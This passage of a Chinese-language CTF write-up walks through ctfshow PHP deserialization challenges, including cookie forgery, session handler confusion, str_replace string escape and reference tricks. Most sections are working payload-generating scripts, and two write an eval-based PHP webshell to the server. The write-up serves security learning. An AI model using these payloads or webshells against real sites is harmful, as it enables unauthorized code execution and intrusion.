class="hljs-string">&#x27;877.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);<br><span class="hljs-variable">$wish</span> = serialize(<span class="hljs-variable">$var</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$wish</span>);<br></code></pre></td></tr></table></figure><h3 id="wen262">wen262</h3><p>伪造<code>cookie</code>，本身没有什么难度，生成脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$m</span> = <span class="hljs-string">&quot;b&quot;</span>;<br><span class="hljs-variable">$t</span> = <span class="hljs-string">&quot;c&quot;</span>;<br><br><span class="hljs-comment">// if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="hljs-comment">//     $msg = new message($f,$m,$t);</span><br><span class="hljs-comment">//     $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="hljs-comment">//     setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="hljs-comment">//     echo &#x27;Your message has been sent&#x27;;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="web263session-反序列化">web263（session 反序列化）</h3><p>这道题有以下几个关键知识点。</p><ol type="1"><li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行<code>序列化</code>， 然后发送给会话保存管理器来进行保存</li><li>不同PHP的session反序列化处理器的处理机制不同。</li><li><code>php</code>处理器将会在键名和键值间加上一条'|'，但是<code>php_serialize</code>则不同。</li></ol><p>解题的思路在于：在申请<code>index.php</code>页面时，我们将类似<code>php_serialize</code>处理器的机制写入，在申请<code>check.php</code>，我们成功调用了<code>php</code>处理器实现反序列化，把一句话木马写进了<code>log-1.php</code>。</p><p>payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;1.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]); highlight_file(__FILE__);?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-comment">// function __destruct()&#123;</span><br>    <span class="hljs-comment">//     file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-string">&quot;|&quot;</span>.serialize(<span class="hljs-variable">$var</span>));<br></code></pre></td></tr></table></figure><p>我们做一个简单的实验验证一下我们的思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>    session_start();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))<br>    &#123;<br><br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please give a cookie!&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在浏览器页面发送请求，我们再检查本地的session文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;limit&quot;</span>;s:<span class="hljs-number">131</span>:<span class="hljs-string">&quot;|O:4:&quot;</span>User<span class="hljs-string">&quot;:3:&#123;s:8:&quot;</span>username<span class="hljs-string">&quot;;s:5:&quot;</span><span class="hljs-number">1</span>.php<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:50:&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;;s:6:&quot;</span>status<span class="hljs-string">&quot;;N;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在<code>php_serialize</code>模式下，我们的<code>payload</code>被当成字符串写入，接着我们换成<code>php</code>处理器读取，看看会有什么效果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span> <br>   error_reporting(<span class="hljs-number">0</span>);<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<br>            <span class="hljs-comment">//file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br>        &#125;<br>    &#125;<br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br>    <span class="hljs-comment">//var_dump($_SESSION);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>output:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p>显然，我们此时的<code>session</code>被重新解读，原来作为字符串内容的'|'此时成了分割符，字符串后续的内容被反序列化。</p><p>回到题目本身，我们的思路就是：</p><ol type="1"><li>在<code>php_serialize</code>模式下，将<code>'|'."serialize($var)"</code>的内容写入<code>SESSION</code></li><li>在<code>php</code>模式下发送请求，从而使得反序列化漏洞产生</li></ol><h3 id="web264str_replace覆盖逃逸">web264（str_replace覆盖逃逸）</h3><p>这题比较有意思。虽然不大能get到实际场景中可能出现的情况，但是在其他的类型的漏洞攻击里能够借鉴这样的思路。</p><p>先看看漏洞的代码，这里选了部分，后续就是常见的<code>session</code>反序列化漏洞，访问一个开了<code>session</code>的<code>php</code>资源，然后验证<code>token</code>，获取反序列化的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=base64_encode(<span class="hljs-variable">$umsg</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这里主要的点就是，要如何把<code>admin</code>写入函数中，这里我们注意到有一个可以利用的攻击点就是<code>str_replace</code>，这里我们看到<code>fuck</code>被<code>loveU</code>替换。看下面几个例子。</p><p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"fuck""</strong>;s:5:"token";s:4:"user";}<br />O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"loveU""</strong>;s:5:"token";s:4:"user";}</p><p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"fuckfuck"1"</strong>;s:5:"token";s:4:"user";}<br />O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"loveUloveU"1"</strong>;s:5:"token";s:4:"user";}</p><p>显然我们可以注意到，如果我们在原句子中使用<code>"</code>，那么和<code>loveU</code>拼接之后，后面的字符串就可以逃逸。由于<code>loveU</code>的长度比<code>fuck</code>多1，我们就多出了可以利用的空间，同时确保反序列化时的字符串对应长度不会出错。</p><p>我们是要在后面逃逸出这样的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>于是我们根据该字符串的长度，构造如下样例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br>    <span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&quot;;s:5:\&quot;token\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;</span>);<br>   <br>    <span class="hljs-variable">$msg</span> = serialize(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-variable">$msg</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$umsg</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>这样我们被替换之后构造的反序列字符串如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">135</span>:<span class="hljs-string">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:4:&quot;</span>user<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>写入<code>sess_xxxxxx</code>文件后，重新读取反序列化时，后面被闭合的部分不会再次被读取，也就成功实现了字符逃逸的过程。</p><h3 id="web265变量引用">web265（变量引用）</h3><p>先上漏洞成因代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;token===<span class="hljs-keyword">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ctfshow</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>]);<br><span class="hljs-variable">$ctfshow</span>-&gt;token=md5(mt_rand());<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;login())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题的关键在于使得两个变量强相等，这也就意味着暴力碰撞<code>0e</code>的可能性就降低了，这里我们直接构造两个变量的引用关系，解决问题。</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;token===<span class="hljs-keyword">$this</span>-&gt;password;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfshowAdmin(<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>    <span class="hljs-variable">$var</span>-&gt;token = &amp;<span class="hljs-variable">$var</span>-&gt;password;<br><br>    <span class="hljs-variable">$msg</span> = serialize(<span class="hljs-variable">$var</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br>    <br>    <span class="hljs-variable">$ctfshow</span> = unserialize(<span class="hljs-variable">$msg</span>);<br>    <span class="hljs-variable">$ctfshow</span>-&gt;token=md5(mt_rand());<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;login())&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win!&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="web266php类和方法大小写绕过">web266（PHP类和方法大小写绕过）</h3><p>这道题的点主要在于PHP类和方法不区分大小写绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfshow(<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br><span class="hljs-comment">//$var = new Ctfshow();</span><br>    <span class="hljs-variable">$cs</span> = serialize(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-variable">$cs</span> = str_replace(<span class="hljs-string">&quot;ctfshow&quot;</span>,<span class="hljs-string">&quot;Ctfshow&quot;</span>,<span class="hljs-variable">$cs</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cs</span>.<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-variable">$ctfshowo</span>=@unserialize(<span class="hljs-variable">$cs</span>);<br>    var_dump(<span class="hljs-variable">$ctfshowo</span>);<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span 